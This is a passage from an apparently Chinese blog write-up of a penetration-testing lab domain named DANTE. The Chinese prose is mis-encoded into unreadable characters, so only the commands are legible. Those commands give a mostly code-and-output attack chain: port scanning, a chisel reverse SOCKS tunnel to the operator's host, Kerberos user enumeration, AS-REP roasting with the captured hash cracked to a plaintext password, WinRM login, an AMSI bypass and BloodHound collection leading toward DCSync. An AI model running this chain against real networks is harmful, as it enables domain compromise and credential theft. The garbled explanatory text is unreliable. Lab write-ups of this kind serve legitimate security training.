msf6 auxiliary<span class="o">(</span>scanner/portscan/tcp<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>THREADS 10
THREADS <span class="o">=&gt;</span> 10
msf6 auxiliary<span class="o">(</span>scanner/portscan/tcp<span class="o">)</span> <span class="o">&gt;</span> run
</code></pre></div></div>
<p>ç«¯å£å¼€æ”¾æƒ…å†µå¦‚ä¸‹ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>+] 172.16.2.5:           - 172.16.2.5:53 - TCP OPEN
<span class="o">[</span>+] 172.16.2.5:           - 172.16.2.5:88 - TCP OPEN
<span class="o">[</span>+] 172.16.2.5:           - 172.16.2.5:139 - TCP OPEN
<span class="o">[</span>+] 172.16.2.5:           - 172.16.2.5:135 - TCP OPEN
<span class="o">[</span>+] 172.16.2.5:           - 172.16.2.5:389 - TCP OPEN
<span class="o">[</span>+] 172.16.2.5:           - 172.16.2.5:445 - TCP OPEN
<span class="o">[</span>+] 172.16.2.5:           - 172.16.2.5:464 - TCP OPEN
<span class="o">[</span>+] 172.16.2.5:           - 172.16.2.5:593 - TCP OPEN
<span class="o">[</span>+] 172.16.2.5:           - 172.16.2.5:636 - TCP OPEN
</code></pre></div></div>
<p>ç›®æ ‡å¼€æ”¾äº† 88 ç«¯å£ï¼Œå¾ˆæœ‰å¯èƒ½æ˜¯å¦å¤–ä¸€å° DCã€‚</p>
<h2 id="æ­å»ºä»£ç†-chiselmsf">æ­å»ºä»£ç†: chisel/msf</h2>
<p>ä¹Ÿå¯ä»¥ä¸Šä¼  chisel.exeï¼Œå¼€å¯ä¸€ä¸ªæ–°çš„ socks ä»£ç†ï¼Œreverse æ¨¡å¼ä¸‹ï¼Œserver éƒ¨ç½²åœ¨æœ¬åœ°ï¼Œè¿œç¨‹å¯ä»¥ç›´æ¥è¿æ¥åˆ°æ­¤å‰è¿è¡Œçš„æœåŠ¡ç«¯ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>start /b ch.exe client 10.10.14.5:12345 R:0.0.0.0:1088:socks
</code></pre></div></div>
<p>ä½¿ç”¨ fscan æ‰«æ</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>fscan <span class="nt">-h</span> 172.16.2.0/24 <span class="nt">-socks5</span> 127.0.0.1:1088 <span class="nt">-p</span> <span class="s2">"1,7,9,13,19,21-23,25,37,42,49,53,69,79-81,85,88,105,109-111,113,123,135,137-139,143,161,179,222,264,384,389,402,407,443-446,465,500,502,512-515,523-524,540,548,554,587,617,623,689,705,771,783,873,888,902,910,912,921,993,995,998,1000,1024,1030,1035,1090,1098-1103,1128-1129,1158,1199,1211,1220,1234,1241,1300,1311,1352,1433-1435,1440,1494,1521,1530,1533,1581-1582,1604,1720,1723,1755,1811,1900,2000-2001,2049,2082,2083,2100,2103,2121,2199,2207,2222,2323,2362,2375,2380-2381,2525,2533,2598,2601,2604,2638,2809,2947,2967,3000,3037,3050,3057,3128,3200,3217,3273,3299,3306,3311,3312,3389,3460,3500,3628,3632,3690,3780,3790,3817,4000,4322,4433,4444-4445,4659,4679,4848,5000,5038,5040,5051,5060-5061,5093,5168,5247,5250,5351,5353,5355,5400,5405,5432-5433,5498,5520-5521,5554-5555,5560,5580,5601,5631-5632,5666,5800,5814,5900-5910,5920,5984-5986,6000,6050,6060,6070,6080,6082,6101,6106,6112,6262,6379,6405,6502-6504,6542,6660-6661,6667,6905,6988,7001,7021,7071,7080,7144,7181,7210,7443,7510,7579-7580,7700,7770,7777-7778,7787,7800-7801,7879,7902,8000-8001,8008,8014,8020,8023,8028,8030,8080-8082,8087,8090,8095,8161,8180,8205,8222,8300,8303,8333,8400,8443-8444,8503,8800,8812,8834,8880,8888-8890,8899,8901-8903,9000,9002,9060,9080-9081,9084,9090,9099-9100,9111,9152,9200,9390-9391,9443,9495,9809-9815,9855,9999-10001,10008,10050-10051,10080,10098,10162,10202-10203,10443,10616,10628,11000,11099,11211,11234,11333,12174,12203,12221,12345,12397,12401,13364,13500,13838,14330,15200,16102,17185,17200,18881,19300,19810,20010,20031,20034,20101,20111,20171,20222,22222,23472,23791,23943,25000,25025,26000,26122,27000,27017,27888,28222,28784,30000,30718,31001,31099,32764,32913,34205,34443,37718,38080,38292,40007,41025,41080,41523-41524,44334,44818,45230,46823-46824,47001-47002,48899,49152,50000-50004,50013,50500-50504,52302,55553,57772,62078,62514,65535"</span> <span class="nt">-o</span> 172.16.2.5_fscan_result.txt

   ___                              _    
  / _ <span class="se">\ </span>    ___  ___ _ __ __ _  ___| | __ 
 / /_<span class="se">\/</span>____/ __|/ __| <span class="s1">'__/ _` |/ __| |/ /
/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    
\____/     |___/\___|_|  \__,_|\___|_|\_\   
                     fscan version: 1.8.2
Socks5Proxy: socks5://127.0.0.1:1088
start infoscan
172.16.2.5:53 open
172.16.2.5:88 open
172.16.2.5:135 open
172.16.2.5:139 open
172.16.2.5:389 open
172.16.2.5:445 open
172.16.2.5:5985 open
172.16.2.5:47001 open
[*] alive ports len is: 8
start vulscan
[*] NetInfo:
[*]172.16.2.5
   [-&gt;]DANTE-DC02
   [-&gt;]172.16.2.5
[*] WebTitle: http://172.16.2.5:47001   code:404 len:315    title:Not Found
[*] WebTitle: http://172.16.2.5:5985    code:404 len:315    title:Not Found
å·²å®Œæˆ 8/8
[*] æ‰«æç»“æŸ,è€—æ—¶: 8m38.713472155s

</span></code></pre></div></div>
<p>fscan æ‰«æå‡ºäº† 172.16.2.5 æœºå™¨åä¸º DANTE-DC02ï¼Œä¸”å¼€æ”¾äº† 5985 ç«¯å£ã€‚</p>

<p>æ­å»ºä»£ç†ä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ msf</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>use auxiliary/server/socks_proxy
<span class="nb">set </span>SRVPORT 1082
run
</code></pre></div></div>
<h2 id="é€šè¿‡-smb-åŒ¿åæšä¸¾ç”¨æˆ·å">é€šè¿‡ SMB åŒ¿åæšä¸¾ç”¨æˆ·å</h2>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> <span class="nt">-f</span> ./proxychains_1088.conf crackmapexec smb 172.16.2.5 <span class="nt">--users</span>

SMB         172.16.2.5      445    DANTE-DC02       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 17763 x64 <span class="o">(</span>name:DANTE-DC02<span class="o">)</span> <span class="o">(</span>domain:DANTE.ADMIN<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
SMB         172.16.2.5      445    DANTE-DC02       <span class="o">[</span>-] Error enumerating domain <span class="nb">users </span>using dc ip 172.16.2.5: NTLM needs domain<span class="se">\u</span>sername and a password
SMB         172.16.2.5      445    DANTE-DC02       <span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying with SAMRPC protocol
</code></pre></div></div>

<p>cme è·å–åˆ°äº†åŸŸå DANTE.ADMIN</p>

<h2 id="é€šè¿‡-kerbrute-æšä¸¾ç”¨æˆ·å">é€šè¿‡ Kerbrute æšä¸¾ç”¨æˆ·å</h2>
<p>é€šè¿‡ socks5 ä»£ç† kerbrute è¿›è¡Œæ‰«æã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> <span class="nt">-f</span> ./proxychains_1088.conf kerbrute userenum <span class="nt">-d</span> dante <span class="nt">--dc</span> 172.16.2.5 users.txt
</code></pre></div></div>
<p>users.txt ä¸­åŒ…å«äº† DANTE.local åŸŸä¸­çš„ç”¨æˆ·åï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>asmith
smoggat
tmodle
ccraven
kploty
jbercov
whaguey
dcamtan
tspadly
ematlis
fglacdon
tmentrso
dharding
smillar
bjohnston
iahmed
plongbottom
jcarrot
lgesley
julian
ben
balthazar
mrb3n
</code></pre></div></div>
<p>ç›®æ ‡ç¯å¢ƒå¯èƒ½å­˜åœ¨ä¸€äº›é—®é¢˜ï¼Œæ‰«ææ—¶ç»å¸¸ä¼šå‡ºç°ï¼š</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>Root cause: Encoding_Error] Encoding_Error: failed to unmarshal KDC<span class="s1">'s reply: asn1: syntax error: sequence truncated                                   
</span></code></pre></div></div>
<p>æŸ¥çœ‹å…¶ä»– writeup æ‰çŸ¥é“å­˜åœ¨ jbercov@dante ç”¨æˆ·ã€‚</p>
<h2 id="asreproast">ASREProast</h2>
<p>é’ˆå¯¹æ²¡æœ‰å¯ç”¨ Kerberos é¢„èº«ä»½éªŒè¯çš„ç”¨æˆ·ï¼Œå¯ä»¥ä½¿ç”¨ ASREProast è·å–ç”¨æˆ·çš„ TGTï¼Œæ­¤è¿‡ç¨‹ä¸éœ€è¦å…·å¤‡åŸŸè´¦æˆ·ï¼Œåªéœ€è¦ä¸ KDC å»ºç«‹è¿æ¥å³å¯è¿›è¡Œæ”»å‡»ã€‚</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-f</span> proxychains_1088.conf GetNPUsers.py dante/jbercov <span class="nt">-no-pass</span> <span class="nt">-dc-ip</span> 172.16.2.5 <span class="nt">-outputfile</span> kerberoasting.hashes

<span class="o">[</span>proxychains] Strict chain  ...  127.0.0.1:1088  ...  172.16.2.5:88  ...  OK
<span class="nv">$krb5asrep$23$jbercov</span>@DANTE:ddb1e0b115be8c818771b834539efef3<span class="nv">$1a2eba1c3051af6bfc2dcb1a07d048c67080a181fe106798265aa7852ecdcffddd164ba83bea8a9ae0fdcc24e6186410a945ce973ce36fd094bfe8e2754dd0d6e3b5a722e89106000d5cb1dc53e20bd6a59ce7e2302cd27f4203b26aa8141230859f3ca0c2cedf389b65829e0d72a56f216dfc3d9a0cea5ba7c6ecd0f1f8532772d707f67cb23d5c7afa6e20b47f41c0a677a36d08b7d4dccc5023bf949fb341935ca38eb9eabc4c307bf52083acb13c178e06377ba7527e49a6b3a7b13c2a69cda8688c4df76364ee00f41b457f250d18b4d4b6917f54e376e8ac7f78eadc433ba58e07</span>
</code></pre></div></div>
<h2 id="johnhashcat-ç ´è§£-krb5asrep">john/hashcat ç ´è§£ krb5asrep</h2>
<p>å¾—åˆ° hash ä¹‹åå¯ä»¥é€šè¿‡ hashcat æˆ–è€… john è¿›è¡Œç ´è§£ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>hashcat <span class="nt">-m</span> 18200 <span class="nt">--force</span> <span class="nt">-a</span> 0 kerberoasting.hashes /webtools/dicts/rockyou.txt
</code></pre></div></div>
<p>æˆåŠŸçˆ†ç ´å‡ºå¯†ç ï¼šmyspace7</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$krb5asrep$23$jbercov@DANTE:ddb1e0b115be8c818771b834539efef3$1a2eba1c3051af6bfc2dcb1a07d048c67080a181fe106798265aa7852ecdcffddd164ba83bea8a9ae0fdcc24e6186410a945ce973ce36fd094bfe8e2754dd0d6e3b5a722e89106000d5cb1dc53e20bd6a59ce7e2302cd27f4203b26aa8141230859f3ca0c2cedf389b65829e0d72a56f216dfc3d9a0cea5ba7c6ecd0f1f8532772d707f67cb23d5c7afa6e20b47f41c0a677a36d08b7d4dccc5023bf949fb341935ca38eb9eabc4c307bf52083acb13c178e06377ba7527e49a6b3a7b13c2a69cda8688c4df76364ee00f41b457f250d18b4d4b6917f54e376e8ac7f78eadc433ba58e07:myspace7
</code></pre></div></div>

<p>ä½¿ç”¨ john è¿›è¡Œç ´è§£ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>john kerberoasting.hashes <span class="nt">--wordlist</span><span class="o">=</span>/webtools/dicts/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password <span class="nb">hash</span> <span class="o">(</span>krb5asrep, Kerberos 5 AS-REP etype 17/18/23 <span class="o">[</span>MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x]<span class="o">)</span>
Will run 8 OpenMP threads
Press <span class="s1">'q'</span> or Ctrl-C to abort, almost any other key <span class="k">for </span>status
myspace7         <span class="o">(</span><span class="nv">$krb5asrep$23$jbercov</span>@DANTE<span class="o">)</span>     
1g 0:00:00:00 DONE <span class="o">(</span>2023-12-29 04:14<span class="o">)</span> 4.000g/s 57344p/s 57344c/s 57344C/s havana..cherry13
Use the <span class="s2">"--show"</span> option to display all of the cracked passwords reliably
Session completed. 
</code></pre></div></div>

<p>jbercov/myspace7</p>

<p>è·å–åˆ°ç”¨æˆ·åå¯†ç ä¹‹åï¼Œç›®æ ‡å¼€å¯äº† 5985 ç«¯å£ï¼Œå› æ­¤å¯ä»¥ä½¿ç”¨ evil-winrm è¿æ¥ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> <span class="nt">-f</span> proxychains_1088.conf evil-winrm <span class="nt">-i</span> 172.16.2.5 <span class="nt">-u</span>  jbercov <span class="nt">-p</span> myspace7 <span class="nt">-s</span> /webtools/movement/PowerSharpPack/PowerSharpBinaries
</code></pre></div></div>
<p>åœ¨ç”¨æˆ· Desktop ç›®å½•å¯ä»¥æ‰¾åˆ° flag.txt</p>

<h2 id="ææƒ-dacl-æ»¥ç”¨å¯¼è‡´-dcsync">ææƒ: DACL æ»¥ç”¨å¯¼è‡´ DCSync</h2>
<p>å€ŸåŠ© evil-winrmï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥åŠ è½½ winPEASEï¼Œå°†æ‰§è¡Œç»“æœä¿å­˜åœ¨æ–‡ä»¶ä¸­ï¼Œç„¶åå°†ç»“æœæ–‡ä»¶ä¸‹è½½å›æ¥ï¼Œä½† winPEAS ç»“æœä¸­å¹¶æ²¡æœ‰å¤ªå¤šæœ‰ç”¨çš„ä¿¡æ¯ã€‚</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Bypass-4MSI
Invoke-winPEAS.ps1
Invoke-winPEAS <span class="o">&gt;&gt;</span> .out
</code></pre></div></div>
<p>åœ¨æ‹¥æœ‰å‡­è¯çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ bloodhound æ¥è·å–æ›´å¤šä¿¡æ¯ã€‚bloodhound-python å¯ä»¥ä½¿ç”¨å¦‚ä¸‹çš„å‘½ä»¤ï¼Œä½†ä¼šå‡ºç° DNS æœåŠ¡å™¨æ— æ³•è§£æçš„é—®é¢˜ã€‚</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>p <span class="nt">-q</span> <span class="nt">-f</span> proxychains_1082.conf bloodhound-python <span class="nt">--zip</span> <span class="nt">-c</span> All <span class="nt">-d</span> dante <span class="nt">-u</span> jbercov <span class="nt">-p</span> myspace7 <span class="nt">-dc</span> 172.16.2.5 <span class="nt">-ns</span> 172.16.2.5 <span class="nt">--dns-tcp</span>
</code></pre></div></div>

<p>æ‰§è¡Œ PowerSharpPack ä¸­çš„ Invoke-SharpHound4 ä¼šå‡ºç°æŠ¥é”™ã€‚</p>

<p>è€ƒè™‘ç›´æ¥ä¸Šä¼  SharpHound.exe ç„¶åæ‰§è¡Œ <code class="language-plaintext highlighter-rouge">-c all</code></p>
<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">*</span><span class="n">Evil-WinRM</span><span class="o">*</span><span class="w"> </span><span class="nx">PS</span><span class="w"> </span><span class="nx">C:\temp</span><span class="err">&gt;</span><span class="w"> </span><span class="o">.</span><span class="nx">\sh.exe</span><span class="w"> </span><span class="nt">-c</span><span class="w"> </span><span class="nx">all</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mf">24.7826199</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">This</span><span class="w"> </span><span class="nx">version</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">SharpHound</span><span class="w"> </span><span class="nx">is</span><span class="w"> </span><span class="nx">compatible</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">4.3.1</span><span class="w"> </span><span class="nx">Release</span><span class="w"> </span><span class="nx">of</span><span class="w"> </span><span class="nx">BloodHound</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mf">24.8920174</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Resolved</span><span class="w"> </span><span class="nx">Collection</span><span class="w"> </span><span class="nx">Methods:</span><span class="w"> </span><span class="nx">Group</span><span class="p">,</span><span class="w"> </span><span class="nx">LocalAdmin</span><span class="p">,</span><span class="w"> </span><span class="nx">GPOLocalGroup</span><span class="p">,</span><span class="w"> </span><span class="nx">Session</span><span class="p">,</span><span class="w"> </span><span class="nx">LoggedOn</span><span class="p">,</span><span class="w"> </span><span class="nx">Trusts</span><span class="p">,</span><span class="w"> </span><span class="nx">ACL</span><span class="p">,</span><span class="w"> </span><span class="nx">Container</span><span class="p">,</span><span class="w"> </span><span class="nx">RDP</span><span class="p">,</span><span class="w"> </span><span class="nx">ObjectProps</span><span class="p">,</span><span class="w"> </span><span class="nx">DCOM</span><span class="p">,</span><span class="w"> </span><span class="nx">SPNTargets</span><span class="p">,</span><span class="w"> </span><span class="nx">PSRemote</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mf">24.9089993</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Initializing</span><span class="w"> </span><span class="nx">SharpHound</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">14:03</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">29/12/2023</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mf">25.0013614</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="p">[</span><span class="n">CommonLib</span><span class="w"> </span><span class="n">LDAPUtils</span><span class="p">]</span><span class="n">Found</span><span class="w"> </span><span class="nx">usable</span><span class="w"> </span><span class="nx">Domain</span><span class="w"> </span><span class="nx">Controller</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">DANTE.ADMIN</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="nx">DANTE-DC02.DANTE.ADMIN</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mf">25.0169982</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Flags:</span><span class="w"> </span><span class="nx">Group</span><span class="p">,</span><span class="w"> </span><span class="nx">LocalAdmin</span><span class="p">,</span><span class="w"> </span><span class="nx">GPOLocalGroup</span><span class="p">,</span><span class="w"> </span><span class="nx">Session</span><span class="p">,</span><span class="w"> </span><span class="nx">LoggedOn</span><span class="p">,</span><span class="w"> </span><span class="nx">Trusts</span><span class="p">,</span><span class="w"> </span><span class="nx">ACL</span><span class="p">,</span><span class="w"> </span><span class="nx">Container</span><span class="p">,</span><span class="w"> </span><span class="nx">RDP</span><span class="p">,</span><span class="w"> </span><span class="nx">ObjectProps</span><span class="p">,</span><span class="w"> </span><span class="nx">DCOM</span><span class="p">,</span><span class="w"> </span><span class="nx">SPNTargets</span><span class="p">,</span><span class="w"> </span><span class="nx">PSRemote</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mf">25.1263707</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Beginning</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="nx">search</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">DANTE.ADMIN</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mf">25.1419972</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Producer</span><span class="w"> </span><span class="nx">has</span><span class="w"> </span><span class="nx">finished</span><span class="p">,</span><span class="w"> </span><span class="nx">closing</span><span class="w"> </span><span class="nx">LDAP</span><span class="w"> </span><span class="nx">channel</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mf">25.1419972</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">LDAP</span><span class="w"> </span><span class="nx">channel</span><span class="w"> </span><span class="nx">closed</span><span class="p">,</span><span class="w"> </span><span class="nx">waiting</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">consumers</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">03</span><span class="p">:</span><span class="mf">55.9584256</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Status:</span><span class="w"> </span><span class="nx">0</span><span class="w"> </span><span class="nx">objects</span><span class="w"> </span><span class="nx">finished</span><span class="w"> </span><span class="p">(</span><span class="o">+</span><span class="mi">0</span><span class="w"> </span><span class="mi">0</span><span class="p">)</span><span class="n">/s</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="nx">Using</span><span class="w"> </span><span class="nx">35</span><span class="w"> </span><span class="nx">MB</span><span class="w"> </span><span class="nx">RAM</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mf">09.6121665</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Consumers</span><span class="w"> </span><span class="nx">finished</span><span class="p">,</span><span class="w"> </span><span class="nx">closing</span><span class="w"> </span><span class="nx">output</span><span class="w"> </span><span class="nx">channel</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mf">09.6433466</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Output</span><span class="w"> </span><span class="nx">channel</span><span class="w"> </span><span class="nx">closed</span><span class="p">,</span><span class="w"> </span><span class="nx">waiting</span><span class="w"> </span><span class="nx">for</span><span class="w"> </span><span class="nx">output</span><span class="w"> </span><span class="nx">task</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">complete</span><span class="w">
</span><span class="n">Closing</span><span class="w"> </span><span class="nx">writers</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mf">09.7527055</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Status:</span><span class="w"> </span><span class="nx">92</span><span class="w"> </span><span class="nx">objects</span><span class="w"> </span><span class="nx">finished</span><span class="w"> </span><span class="p">(</span><span class="o">+</span><span class="mi">92</span><span class="w"> </span><span class="mf">2.090909</span><span class="p">)</span><span class="n">/s</span><span class="w"> </span><span class="o">--</span><span class="w"> </span><span class="nx">Using</span><span class="w"> </span><span class="nx">42</span><span class="w"> </span><span class="nx">MB</span><span class="w"> </span><span class="nx">RAM</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mf">09.7527055</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Enumeration</span><span class="w"> </span><span class="nx">finished</span><span class="w"> </span><span class="nx">in</span><span class="w"> </span><span class="nx">00:00:44.6321094</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mf">09.8151969</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">Saving</span><span class="w"> </span><span class="nx">cache</span><span class="w"> </span><span class="nx">with</span><span class="w"> </span><span class="nx">stats:</span><span class="w"> </span><span class="nx">51</span><span class="w"> </span><span class="nx">ID</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">type</span><span class="w"> </span><span class="nx">mappings.</span><span class="w">
 </span><span class="mi">52</span><span class="w"> </span><span class="n">name</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">SID</span><span class="w"> </span><span class="nx">mappings.</span><span class="w">
 </span><span class="mi">0</span><span class="w"> </span><span class="n">machine</span><span class="w"> </span><span class="nx">sid</span><span class="w"> </span><span class="nx">mappings.</span><span class="w">
 </span><span class="mi">2</span><span class="w"> </span><span class="n">sid</span><span class="w"> </span><span class="nx">to</span><span class="w"> </span><span class="nx">domain</span><span class="w"> </span><span class="nx">mappings.</span><span class="w">
 </span><span class="mi">0</span><span class="w"> </span><span class="n">global</span><span class="w"> </span><span class="nx">catalog</span><span class="w"> </span><span class="nx">mappings.</span><span class="w">
</span><span class="mi">2023</span><span class="nt">-12-29T14</span><span class="p">:</span><span class="mi">04</span><span class="p">:</span><span class="mf">09.8308184</span><span class="o">+</span><span class="mi">00</span><span class="p">:</span><span class="mi">00</span><span class="o">|</span><span class="n">INFORMATION</span><span class="o">|</span><span class="n">SharpHound</span><span class="w"> </span><span class="nx">Enumeration</span><span class="w"> </span><span class="nx">Completed</span><span class="w"> </span><span class="nx">at</span><span class="w"> </span><span class="nx">14:04</span><span class="w"> </span><span class="nx">on</span><span class="w"> </span><span class="nx">29/12/2023</span><span class="o">!</span><span class="w"> </span><span class="nx">Happy</span><span class="w"> </span><span class="nx">Graphing</span><span class="o">!</span><span class="w">
</span></code></pre></div></div>

<p>å¯¼å…¥ç»“æœä¹‹åæŸ¥çœ‹ JBERCOV çš„ä¿¡æ¯ï¼Œå¯ä»¥å‘ç° JBERCOV ç”¨æˆ·å…·å¤‡ GetChangesAll æƒé™ï¼Œè€Œ GetChangesAll æƒé™æ„å‘³ç€å¯ä»¥åˆ©ç”¨ DCSync å¯¼å‡ºåŸŸå†…çš„æ‰€æœ‰ hashã€‚</p>

<p><img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231229082415.png" alt="20231229082415"></p>

<!-- ![Alt text](../../../../../assets/image-10.png) -->

<p>é€šå¸¸æƒ…å†µä¸‹ DCSync æƒé™ä»…æœ‰ç®¡ç†å‘˜ã€åŸŸç®¡ç†å‘˜ã€ä¼ä¸šç®¡ç†å‘˜å’ŒåŸŸæ§åˆ¶å™¨ç»„çš„æˆå‘˜æ‰å…·å¤‡ï¼Œä½†è¿™é‡Œ JBERCOV ç”¨æˆ·å¹¶ä¸æ˜¯ç®¡ç†å‘˜ç”¨æˆ·ï¼Œå±äº DACL æ»¥ç”¨ã€‚</p>

<p>åŸŸæœåŠ¡ä¸­èµ„æºçš„è®¿é—®æƒé™é€šå¸¸é€šè¿‡ä½¿ç”¨è®¿é—®æ§åˆ¶æ¡ç›® (ACE) æ¥æˆäºˆï¼ŒDACLï¼ˆActive Directory è‡ªä¸»è®¿é—®æ§åˆ¶åˆ—è¡¨ï¼‰æ˜¯ç”± ACEï¼ˆè®¿é—®æ§åˆ¶æ¡ç›®ï¼‰ç»„æˆçš„åˆ—è¡¨ï¼Œç”¨äºæ ‡è¯†å…è®¸æˆ–æ‹’ç»è®¿é—®å¯¹è±¡çš„ç”¨æˆ·å’Œç»„ã€‚</p>

<p>DACL æ»¥ç”¨é€šå¸¸å¯ä»¥ä½¿ç”¨ BloodHoundã€Powersploit ä¸­çš„ Get-DomainObjectAcl æ¥è¿›è¡Œæšä¸¾ã€‚</p>

<p>DACL æ»¥ç”¨çš„æ€ç»´å¯¼å›¾å¦‚ä¸‹ï¼š
<img src="https://de34dnotespics.oss-cn-beijing.aliyuncs.com/img/20231229082957.png" alt="20231229082957"></p>

<!-- ![Alt text](../../../../../assets/image-11.png) -->

<p>æ¥ç€æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ secretdump æ¥å¯¼å‡ºåŸŸæ§ä¸­çš„ hash</p>
